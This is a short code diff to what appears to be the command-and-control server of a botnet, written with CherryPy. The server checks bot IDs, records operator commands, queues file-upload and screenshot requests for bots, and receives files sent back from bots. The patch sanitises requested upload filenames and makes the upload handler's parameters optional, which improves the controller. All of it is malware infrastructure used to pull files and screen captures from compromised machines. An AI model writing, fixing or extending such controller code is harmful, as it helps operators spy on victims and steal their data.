@@ -197,7 +197,7 @@ class API(object):
             raise cherrypy.HTTPError(403)
         exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
         if cmd.startswith("upload "):
-            pending_uploads.append(cmd.split("upload ")[1])
+            pending_uploads.append(os.path.basename(cmd.split("upload ")[1]))
         if cmd.startswith("screenshot"):
             pending_uploads.append("screenshot")
 
@@ -220,9 +220,11 @@ class API(object):
         self.upload(botid, src, file)
 
     @cherrypy.expose
-    def upload(self, botid, src, uploaded):
+    def upload(self, botid, src='', uploaded=None):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
+        if not src:
+            src = uploaded.filename
         expected_file = src
         if expected_file not in pending_uploads and src.endswith(".zip"):
             expected_file = src.split(".zip")[0]
